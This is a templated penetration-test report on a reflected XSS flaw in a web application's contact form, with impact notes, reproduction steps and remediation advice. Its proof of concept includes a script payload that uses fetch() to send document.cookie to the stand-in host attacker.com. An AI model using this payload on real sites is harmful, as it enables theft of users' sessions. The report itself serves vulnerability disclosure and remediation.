# Penetration Testing Writeup: Reflected XSS in Form Input

## Executive Summary

A Reflected Cross-Site Scripting (XSS) vulnerability was found in [Target
Application]’s form submission process during a penetration test. This
vulnerability allows attackers to inject malicious scripts via form inputs,
which are reflected in the response, compromising user security. This report
details the issue and provides remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Reflected
- **Severity**: High
- **Affected Component**: Contact form submission
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/contact`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 22, 2025

### Description

The contact form does not sanitize user inputs before reflecting them in the
response page. This allows attackers to inject scripts that execute when the
response is rendered in the victim’s browser.

### Impact

- **Session Theft**: Attackers can steal user cookies.
- **Phishing Attacks**: Fake forms can capture credentials.
- **Data Leakage**: Sensitive form data can be exfiltrated.
- **Reputation Harm**: Defacement can damage trust.

### Proof of Concept

1. Submit the contact form with the name field:
   `<script>alert('Reflected XSS');</script>`.
2. Observe an alert box on the response page.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to `https://[target-application]/contact`.
2. Enter `<script>alert('Reflected XSS');</script>` in the name field.
3. Submit the form and confirm the alert.

## Remediation Recommendations

1. **Input Validation**:
   - Restrict form inputs to expected characters.
2. **Output Encoding**:
   - Encode outputs (e.g., `<` to `&lt;`) before rendering.
3. **Content Security Policy**:
   - Use CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Coding**:
   - Train developers on XSS prevention.
5. **Regular Testing**:
   - Conduct periodic security assessments.

## Conclusion

The Reflected XSS vulnerability in the contact form of [Target Application]
requires urgent remediation to protect users and maintain trust.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Form XSS Alert](https://example.com/images/form-xss-alert.png)
